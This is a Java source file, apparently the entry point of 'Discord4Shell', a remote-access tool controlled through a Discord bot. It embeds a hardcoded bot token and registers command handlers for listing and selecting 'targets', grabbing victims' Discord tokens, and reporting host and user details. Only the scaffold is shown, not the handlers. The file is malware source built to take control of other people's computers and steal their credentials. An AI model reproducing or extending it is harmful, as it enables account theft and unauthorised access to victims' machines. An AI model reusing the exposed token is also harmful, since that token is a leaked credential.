package org.example.Discord4Shell;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.requests.GatewayIntent;
import org.example.commands.*;

import java.io.IOException;


public class Discord4Shell {
    public static String user = System.getProperty("user.name");
    public static void main(String[] args) {
        JDA bot = JDABuilder.createDefault("MTA3MTc1Njg1MTQ2Njc1MjAzMA.GaKVnr.O68GekLTZ2xLra8fx1VQKZjPUkAnNh3-ru5knA")
                .setActivity(Activity.playing("No Larry?"))
                .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                .build();


        bot.addEventListener(new TargetsListMessage());
        bot.addEventListener(new SelectTargetMessage());
        bot.addEventListener(new MessageTargetMessage());
        bot.addEventListener(new GetDiscordTokenMessage());
        bot.addEventListener(new GetHostMessage());
        bot.addEventListener(new WhoAmIMessage());




    }
}
